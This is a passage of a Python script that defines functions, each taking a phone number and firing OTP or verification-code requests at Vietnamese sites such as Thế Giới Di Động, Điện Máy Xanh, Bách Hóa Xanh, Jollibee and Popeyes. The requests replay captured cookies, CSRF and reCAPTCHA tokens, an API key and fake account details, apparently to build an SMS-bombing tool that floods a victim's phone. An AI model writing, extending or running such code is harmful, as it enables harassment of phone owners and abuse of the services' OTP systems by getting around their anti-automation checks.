        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8PqbgkggxhxIv0ea3fAwIkKxB21PUgolHRAbfTWcWPJXkdbEZS3HsLMvzCA0mLMIR-nxC13DHitd0EoqCVvJI4Mk8gdDuS_enHlzt2dEftL_OYcDVY9vJW6BatENkupKvRLYTUs4ncO_2Pcl7wIeACI',
        'reCaptchaToken': '03AFcWeA5lcMlbt8gdRuT8zRuThEs43bEX8wY3Bq1IXQ7HHTVLa03cXnh57mZHt14qzsse9czcadglZwwadd6I4Q3WQOlujLGjmNjx_E6T_f5DVatlV63HNg-y8Ueu46mA0Gf4Ts1V1Pqeh7EoeFSOi8bSfLCvuqVHlnnlJJINxNCv6ckPx8NSy7wzlfRCh2P3W20y9jc_6fsWTZnGqS5n8WxDyXuAG7mBu5y4IiQCHoSvkmubEiBUL9AzimajARB3FvZH-lp0oqteK8b8jn78P_1_YTPfvCg_KbstuTOuNe_xB1kiAK1tKpXcymRW94t5E0SePpHZvtWn5yJcx0TarfSQ_iNKukDy0bxRylY25GD9XCp8ELLgSKMWOzF6gE7LvOpU58IflpNdCy_HelmifAMGgc5lXFY-KSq16P_-PeIqQyM87FVyYSCFiUotMJ1JxGJ_bnrpatp0bl00oY-Mi6iocHmY7CSQHGbSN5r5QsWH-9LIeqgCwgP8wOGoqy49jTmyafwIslBaDLY0Z4IZXecfZHX_HMYLxHgeiZk2mIKoVieyW19CpVwbv0QP8SedjB5txknzAomHM_IkW656uvLGp7wUwwVoTzJZArfcZ98her5V5r50dU4aIoABz0mEhoOkSu6T00G1a6-42TySVfJP0S0gThxaQDk4YvcrPkK9yDkgb-lpbxs93d8orZARRZLzNCqWzECK9W2OEkTLnVbjFT78311umlymNAkdzpD4xZOfY__R5lJAnp5owyzpi14Kx-G0ul1fidyuu7yOzFDtvGAfPWiOduBatEKyNr9G0aVwGY6MM8Oo19_SSGHGrakcU9NWUs5V9hi9E_6XKfD76kYu9h3WxInjKAcr6vVZVQx3ikoLJmEFLYWEnIWszGWxkC7mOwH7s4gopBrPM79wFsZYYFA57g',
        'reCaptchaTokenV2': '',
    }
    
    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def dienmayxanh(sdt):
    cookies = {
        '_ga': 'GA1.1.117208875.1722958974',
        '_pk_id.8.8977': 'a43be1516dc9d4ab.1722958974.',
        '__uidac': '0166b2447fd995b124451c545ee0d883',
        '_fbp': 'fb.1.1722958975415.275786858607201219',
        'dtdz': '7d3e3e86-0afe-5805-89af-f17977e5d7f6',
        'TBMCookie_3209819802479625248': '276218001731144255GaV1RwwNxXtPXMLpXAKRYNakkwM=',
        '___utmvm': '###########',
        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceType%22%3Anull%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        '_gcl_aw': 'GCL.1731144256.Cj0KCQiArby5BhCDARIsAIJvjISQN36IQhpY-OjSBQQBuvqNkZO31GiRSkEMU8zUMUiKz-1wn8Us85saArgXEALw_wcB',
        '_gcl_gs': '2.1.k1$i1731144254$u27315113',
        '_gcl_au': '1.1.970802318.1731144256',
        'utm_source': 'A8WKOm1Ng',
        '_pk_ref.8.8977': '%5B%22A8WKOm1Ng%22%2C%22%22%2C1731144256%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.8.8977': '1',
        '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXarWDYNh3kwJP4Wc1VS2vuTWH1SLqnRRWrH4Ao3O.1',
        '_hjSessionUser_46615': 'eyJpZCI6IjIzYTY2MDY2LTU5NDAtNTlkOS1hZDQ0LWRjYWUzZGZmMWNiMiIsImNyZWF0ZWQiOjE3MzExNDQyNTY1MjUsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjSession_46615': 'eyJpZCI6ImIzYjE3OWY5LWMyMGMtNDRhNS1iYjE1LWU5YWFkNjY1MzQ5MyIsImMiOjE3MzExNDQyNTY1MjYsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
        '__admUTMtime': '1731144256',
        'cebs': '1',
        '__adm_upl': 'eyJ0aW1lIjoxNzMxMTQ0MjYyLCJfdXBsIjpudWxsfQ==',
        '_ce.clock_data': '-718%2C116.111.184.213%2C1%2C7675d59b5e84e0a878ee6f0a97f9056f%2CChrome%2CVN',
        'cebsp_': '1',
        '__utm': 'source%3DA8WKOm1Ng',
        '__utm': 'source%3DA8WKOm1Ng',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        'SvID': 'new2691|Zy8qR|Zy8qQ',
        '_oauthCDP_WebDMX': '2EICzzDZp6mafDUUPhcXbSxwjvY9BSbQe7abBPKYWoSRcc3IFrVkeFX1XGW28LXgWYxRIVJei6EJYVlwYaQU95k_BwniaDkIVs9rmg94SDIynW46h1xqLJAytqg47So3gQSr0Y3OeLrTY2QtrAluYPl2slyiut6YQVQni7kAmkt5OrPyKtWX2QiSEpYHrmg94nl39fnsn5a8mAa1OkcmjrUlScpXrmg94c4NJ40Yxbn118jj2HzgjjSgy9Xxh9se_5ggFngtr0J9',
        '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8I_7LEtfhrBBgb4sB6l3habNIKJ1Y7MVQ0bml7u8467ZQGS3EjD2r1wvUOcnptc0032IZBkEMWy2_xBiKjAcWytovgpqU0izwq5YKscuKCHFT1YMdwmh7YVfEhYv6mt3gR6g_fhkeYIbarmZxTOw0E0',
        '_ga_Y7SWKJEHCE': 'GS1.1.1731144256.3.0.1731144257.59.0.0',
        '_ce.s': 'v~aa0d9dfc1bb2f4961def88ba34016741b58aa889~lcw~1731144257754~lva~1731144256651~vpv~2~vir~new~v11.cs~218102~v11.s~6463f360-9e7c-11ef-a495-e598659b4644~v11.sla~1731144257793~v11.send~1731144257212~gtrk.la~m39yle4h~lcw~1731144257793',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "_ga=GA1.1.117208875.1722958974; _pk_id.8.8977=a43be1516dc9d4ab.1722958974.; __uidac=0166b2447fd995b124451c545ee0d883; _fbp=fb.1.1722958975415.275786858607201219; dtdz=7d3e3e86-0afe-5805-89af-f17977e5d7f6; TBMCookie_3209819802479625248=276218001731144255GaV1RwwNxXtPXMLpXAKRYNakkwM=; ___utmvm=###########; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceType%22%3Anull%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_aw=GCL.1731144256.Cj0KCQiArby5BhCDARIsAIJvjISQN36IQhpY-OjSBQQBuvqNkZO31GiRSkEMU8zUMUiKz-1wn8Us85saArgXEALw_wcB; _gcl_gs=2.1.k1$i1731144254$u27315113; _gcl_au=1.1.970802318.1731144256; utm_source=A8WKOm1Ng; _pk_ref.8.8977=%5B%22A8WKOm1Ng%22%2C%22%22%2C1731144256%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.8.8977=1; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXarWDYNh3kwJP4Wc1VS2vuTWH1SLqnRRWrH4Ao3O.1; _hjSessionUser_46615=eyJpZCI6IjIzYTY2MDY2LTU5NDAtNTlkOS1hZDQ0LWRjYWUzZGZmMWNiMiIsImNyZWF0ZWQiOjE3MzExNDQyNTY1MjUsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_46615=eyJpZCI6ImIzYjE3OWY5LWMyMGMtNDRhNS1iYjE1LWU5YWFkNjY1MzQ5MyIsImMiOjE3MzExNDQyNTY1MjYsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; __admUTMtime=1731144256; cebs=1; __adm_upl=eyJ0aW1lIjoxNzMxMTQ0MjYyLCJfdXBsIjpudWxsfQ==; _ce.clock_data=-718%2C116.111.184.213%2C1%2C7675d59b5e84e0a878ee6f0a97f9056f%2CChrome%2CVN; cebsp_=1; __utm=source%3DA8WKOm1Ng; __utm=source%3DA8WKOm1Ng; __iid=; __iid=; __su=0; __su=0; SvID=new2691|Zy8qR|Zy8qQ; _oauthCDP_WebDMX=2EICzzDZp6mafDUUPhcXbSxwjvY9BSbQe7abBPKYWoSRcc3IFrVkeFX1XGW28LXgWYxRIVJei6EJYVlwYaQU95k_BwniaDkIVs9rmg94SDIynW46h1xqLJAytqg47So3gQSr0Y3OeLrTY2QtrAluYPl2slyiut6YQVQni7kAmkt5OrPyKtWX2QiSEpYHrmg94nl39fnsn5a8mAa1OkcmjrUlScpXrmg94c4NJ40Yxbn118jj2HzgjjSgy9Xxh9se_5ggFngtr0J9; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8I_7LEtfhrBBgb4sB6l3habNIKJ1Y7MVQ0bml7u8467ZQGS3EjD2r1wvUOcnptc0032IZBkEMWy2_xBiKjAcWytovgpqU0izwq5YKscuKCHFT1YMdwmh7YVfEhYv6mt3gR6g_fhkeYIbarmZxTOw0E0; _ga_Y7SWKJEHCE=GS1.1.1731144256.3.0.1731144257.59.0.0; _ce.s=v~aa0d9dfc1bb2f4961def88ba34016741b58aa889~lcw~1731144257754~lva~1731144256651~vpv~2~vir~new~v11.cs~218102~v11.s~6463f360-9e7c-11ef-a495-e598659b4644~v11.sla~1731144257793~v11.send~1731144257212~gtrk.la~m39yle4h~lcw~1731144257793",
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8I_7LEtfhrBBgb4sB6l3haax8SfIIXulLJbc2A7XfrR4nrhbAAW7EBQNEjBGtcHvPWTPlQPA9KAIwLXoi3TBEuEcxl-guc440iHWQze0CtKWpbUeS99qdCcBSgHEwpb-RNIQXFxq1J7fi06T8eVy6Bc',
        'reCaptchaToken': '03AFcWeA4Hvq3zPtbPUozBCvmQ1_GOgAipp_rSBcvYLwU33SOkDnEl1YBX4RxFckMcyE7q56PElhOPmkufkiwbrWSMp-PCg3-55vJqO2UXaS9lCa0NOFmO8GFF6zoa7rw2MpVB1xBMCGqSPdlX6kcwebwnUmXlRRWRiomPj55l7-xomIV_91L3zscp-IcryvwrYb2_m64jNhJ8HkQwL2Hg9fmB_PU2Z2RXAs618trTBFPePgOrouYlGAKHa5--rxeZqrDPpStmY1EmN0VpI3GkUCRrPuLpAjXYSLKLpklzQdrKz3C20iaWq8D5owWsLf43mUlBK4oGWnOK5jLdmgjjA4BGUAQFDxfxSvSz-ztE2_Hev-wUsxh_0GiY-3MrEy_qM9InOtiJYgex04g3tUv-DINGL7VvkTpDTH9FHJJy8riSV5EbdM3SsPhXxtheUW5hoXkoDuenhMUg0cddvwxc6mrTCFYymMCPF8WKhcR_sKMTxehq_pCi1_WajqbU08xK3fEsPUQhNblpLAXtfSV1rryT8uJMrlL_qJ5BMVhnsaMyxGWPcl3BdsVyaxP_TqTFqmAKUZmVEAZ8IIh4jBaMlqHt2GnzppbnZMEHQqiRZLf0brd6OeehUonqIx3pUkCa2Ex3E9pGqirk6BqWapl6fKKWFDn-TUM5SrTEe7z_KZf0IV7Fn2upEiWfXC-Of7JN19LZ2V6o6MfDCX-yY-tj3JbP02gKTZklmdhFRPmY9qsHCLOc8mJSp9Tu32o6acr8rzLmRkkl0dnUPk7T3lYUCWyxKR9QHYymN2cBLCeVwzeK_Ci12fk7fQE-nMI95g7QPAOIM1LYImnv5GB7jcNexRDQqUYZBaDLBEOMMlZbVZ5y42BDhJMqZVjsvoeZB7yy3h123C3K6EWrQGYo-7OXGLGp3BCEzlfVfg',
        'reCaptchaTokenV2': '',
    }

    response = requests.post(
        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def bachhoaxanh(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Access-Control-Allow-Origin': '*',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://www.bachhoaxanh.com',
        'Referer': 'https://www.bachhoaxanh.com/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'authorization': 'Bearer 1A82A059F2A4EB4B3F895426A319EC0E',
        'deviceid': '8025a3cc-5ede-4edb-a718-7471e6042b18',
        'platform': 'webnew',
        'referer-url': 'https://www.bachhoaxanh.com/dang-nhap',
        'reversehost': 'http://bhxapi.live',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'xapikey': 'bhx-api-core-2022',
    }

    json_data = {
        'deviceId': '8025a3cc-5ede-4edb-a718-7471e6042b18',
        'userName': sdt,
        'isOnlySms': 1,
        'ip': '',
        'token': '03AFcWeA5EhBbcLcrxzhkKYVwrY71acfHvXBdwccojXmzChPyMYk8a0JKouXEZ47BuWSXeOOENY-gODv3d-uTvuvtDrN0I-LL62cPxZT_EJG1jXsfceYq_L9YmJD4Wd_JuD-GjO9UYn7-c7VEy5_n7rtPkMFfxwMgcBvn-gZ1hTlRZd27_-O0QAKAe6rJW5TqLIqWrZ317VvKZHRsv5iEli7vkrBDUaVhoN2t_rVHeJaJ7Mp3B6Bi3ZY-G7NKAsqhywLrScvv-kOnBOEvFN_otmawcPUOV2dWAlPkjxUmDgm89lwB2QVGH6HcF84iGgeuTvojWmt98p0NkoZwvN3H4S23eZnnE2ivh4Uby1ILQkdhklWHe6d9Se5vtz3q6EMXGs7_Ojq2V-SVL_Vwp2yz9uuZig08XTWDPsbfTgI-amNIjGdPZfXDrZ12onLDb_hhCLOwMQPeVz_4WUjeKq8Y-89QCXqSL3z23xG5TJ_GhAAUIZA8vCzMkwIn3RcaHdl6753FlGGF7rMse6SwxxzOycZSr8QGNCaDnSWv-0VX71ssyhUFDr5GUTI-ME5LaRlOCLrexgw4jugITTh_7QFqE8dN3jbtcb_KYIaZWOdSxy6G9B6LisljKooAmfpd6w6ou5pknmWkFYAv3jlWEgn-kSW7dGLoufqojpTRBeuGC8yrVmhBbjupRP469GceAMfZEvNQ1bsTdghnq45VIr515WsYzTGhocoKnMiYSBZZmR4Dr_Kin-1sqUa2CIoTdKMYUG4R39wBnvomcqsLKRiE3yL0fAlf3d_i68Rsu-hX2F_UvMYbCGp4cWI8rPkVcE01CFBN8Al3elxe9p40W1ylymFmBbfxfc38MTjpI9M3ReVeuHyaBs8gX1gCPNLC7NTMmaIDfe9EsdVf8PLjhddhlLSTQTblla7r31A',
    }

    response = requests.post('https://apibhx.tgdd.vn/User/LoginWithPassword', headers=headers, json=json_data)


def jollibee(sdt):
    cookies = {
        '_tt_enable_cookie': '1',
        '_ttp': 'F-w8qiqulDxxznC7b0SozkkMTja',
        'PHPSESSID': 'nqbpsvs1701sh163sc3q3smrin',
        '__stp': 'eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5YzVkMWU1Zi1lOTZiLTQzZjMtOGZlNy1kZjg4NGJkNDExOTMifQ==',
        '__stdf': 'MA==',
        '__stgeo': 'IjAi',
        '__stbpnenable': 'MQ==',
        'form_key': 'FkQJimX8KUo5ASaO',
        '_fbp': 'fb.2.1731144434271.652621192850944957',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'form_key': 'FkQJimX8KUo5ASaO',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        '_gid': 'GA1.3.601306324.1731144435',
        'csp': '1',
        'csd': '1',
        '_ga_7QF2M4198R': 'GS1.1.1731144434.2.1.1731144438.56.0.0',
        '_ga_G92EK3GZLQ': 'GS1.1.1731144434.2.1.1731144438.56.0.0',
        '_ga': 'GA1.1.1539815736.1722959015',
        '_ga_JCDZDB6J2V': 'GS1.1.1731144435.2.1.1731144438.57.0.0',
        '__sts': 'eyJzaWQiOjE3MzExNDQ0MzIyMjksInR4IjoxNzMxMTQ0NDM5MDU3LCJ1cmwiOiJodHRwcyUzQSUyRiUyRmpvbGxpYmVlLmNvbS52biUyRmN1c3RvbWVyJTJGYWNjb3VudCUyRmNyZWF0ZSUyRiIsInBldCI6MTczMTE0NDQzOTA1Nywic2V0IjoxNzMxMTQ0NDMyMjI5LCJwVXJsIjoiaHR0cHMlM0ElMkYlMkZqb2xsaWJlZS5jb20udm4lMkYlMjNzb2NpYWwtbG9naW4tcG9wdXAiLCJwUGV0IjoxNzMxMTQ0NDM3NDI4LCJwVHgiOjE3MzExNDQ0Mzc0Mjh9',
        'private_content_version': 'e644a8f4cf03313dacb1c01a77a3302b',
        'section_data_ids': '%7B%22amfacebook-pixel%22%3A1731145440%2C%22notification_count%22%3A1731145440%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1731145440%2C%22customer%22%3A1731145435%2C%22compare-products%22%3A1731145435%2C%22last-ordered-items%22%3A1731145435%2C%22cart%22%3A1731145435%2C%22directory-data%22%3A1731145435%2C%22captcha%22%3A1731145435%2C%22instant-purchase%22%3A1731145435%2C%22loggedAsCustomer%22%3A1731145435%2C%22persistent%22%3A1731145435%2C%22review%22%3A1731145435%2C%22wishlist%22%3A1731145435%2C%22ammessages%22%3A1731145435%2C%22product_area_price%22%3A1731145435%2C%22customer_voucher%22%3A1731145435%2C%22recently_viewed_product%22%3A1731145435%2C%22recently_compared_product%22%3A1731145435%2C%22product_data_storage%22%3A1731145435%2C%22paypal-billing-agreement%22%3A1731145435%2C%22messages%22%3Anull%7D',
        '_gcl_au': '1.1.1330736817.1731144434.1006402460.1731144435.1731144495',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_tt_enable_cookie=1; _ttp=F-w8qiqulDxxznC7b0SozkkMTja; PHPSESSID=nqbpsvs1701sh163sc3q3smrin; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5YzVkMWU1Zi1lOTZiLTQzZjMtOGZlNy1kZjg4NGJkNDExOTMifQ==; __stdf=MA==; __stgeo=IjAi; __stbpnenable=MQ==; form_key=FkQJimX8KUo5ASaO; _fbp=fb.2.1731144434271.652621192850944957; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; form_key=FkQJimX8KUo5ASaO; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _gid=GA1.3.601306324.1731144435; csp=1; csd=1; _ga_7QF2M4198R=GS1.1.1731144434.2.1.1731144438.56.0.0; _ga_G92EK3GZLQ=GS1.1.1731144434.2.1.1731144438.56.0.0; _ga=GA1.1.1539815736.1722959015; _ga_JCDZDB6J2V=GS1.1.1731144435.2.1.1731144438.57.0.0; __sts=eyJzaWQiOjE3MzExNDQ0MzIyMjksInR4IjoxNzMxMTQ0NDM5MDU3LCJ1cmwiOiJodHRwcyUzQSUyRiUyRmpvbGxpYmVlLmNvbS52biUyRmN1c3RvbWVyJTJGYWNjb3VudCUyRmNyZWF0ZSUyRiIsInBldCI6MTczMTE0NDQzOTA1Nywic2V0IjoxNzMxMTQ0NDMyMjI5LCJwVXJsIjoiaHR0cHMlM0ElMkYlMkZqb2xsaWJlZS5jb20udm4lMkYlMjNzb2NpYWwtbG9naW4tcG9wdXAiLCJwUGV0IjoxNzMxMTQ0NDM3NDI4LCJwVHgiOjE3MzExNDQ0Mzc0Mjh9; private_content_version=e644a8f4cf03313dacb1c01a77a3302b; section_data_ids=%7B%22amfacebook-pixel%22%3A1731145440%2C%22notification_count%22%3A1731145440%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1731145440%2C%22customer%22%3A1731145435%2C%22compare-products%22%3A1731145435%2C%22last-ordered-items%22%3A1731145435%2C%22cart%22%3A1731145435%2C%22directory-data%22%3A1731145435%2C%22captcha%22%3A1731145435%2C%22instant-purchase%22%3A1731145435%2C%22loggedAsCustomer%22%3A1731145435%2C%22persistent%22%3A1731145435%2C%22review%22%3A1731145435%2C%22wishlist%22%3A1731145435%2C%22ammessages%22%3A1731145435%2C%22product_area_price%22%3A1731145435%2C%22customer_voucher%22%3A1731145435%2C%22recently_viewed_product%22%3A1731145435%2C%22recently_compared_product%22%3A1731145435%2C%22product_data_storage%22%3A1731145435%2C%22paypal-billing-agreement%22%3A1731145435%2C%22messages%22%3Anull%7D; _gcl_au=1.1.1330736817.1731144434.1006402460.1731144435.1731144495',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0MjA2MDQiLCJhcCI6IjEzODU5MjEyNzYiLCJpZCI6IjMwNDA1MjMyN2FjOGY5MzUiLCJ0ciI6ImViMGE4ZWJiNDVjYWNkNjAyN2E3ZmJkZTk2MzQ3MTdiIiwidGkiOjE3MzExNDQ0OTU2MzB9fQ==',
        'origin': 'https://jollibee.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://jollibee.com.vn/customer/account/create/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-eb0a8ebb45cacd6027a7fbde9634717b-304052327ac8f935-01',
        'tracestate': '3420604@nr=0-1-3420604-1385921276-304052327ac8f935----1731144495630',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-newrelic-id': 'VwIFUVBTDBABV1FaDwAOUFUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'form_key': 'FkQJimX8KUo5ASaO',
        'success_url': '',
        'error_url': '',
        'lastname': 'TRONG',
        'firstname': 'PHAM',
        'phone': sdt,
        'email': 'dfdsc454eds@gmail.com',
        'password': '123khang888@',
        'password_confirmation': '123khang888@',
        'dob': '01/01/2000',
        'gender': '1',
        'province_customer': '1',
        'agreement': '1',
        'is_subscribed': '1',
        'otp_type': 'create',
        'ip': '103.14.154.178',
    }

    response = requests.post('https://jollibee.com.vn/otp/action/getOTP', cookies=cookies, headers=headers, data=data)

def popeyes(sdt):
    cookies = {
        '_ga': 'GA1.1.35679564.1722959625',
        '_fbp': 'fb.1.1722959624880.154103995458781639',
        '_ga_GFJFDNFKH2': 'GS1.1.1722959624.1.0.1722959693.0.0.0',
        '_gcl_au': '1.1.717576795.1722959619.1133139527.1722959719.1722959719',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/json',
        # 'cookie': '_ga=GA1.1.35679564.1722959625; _fbp=fb.1.1722959624880.154103995458781639; _ga_GFJFDNFKH2=GS1.1.1722959624.1.0.1722959693.0.0.0; _gcl_au=1.1.717576795.1722959619.1133139527.1722959719.1722959719',
        'origin': 'https://popeyes.vn',
        'ppy': 'DTSNBT', #CHỖ NÀY MỖI LẦN LÀ BỊ ĐỔI LIÊN TỤC
        'priority': 'u=1, i',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': sdt,
        'firstName': 'PHAM',
        'lastName': 'TRONG',
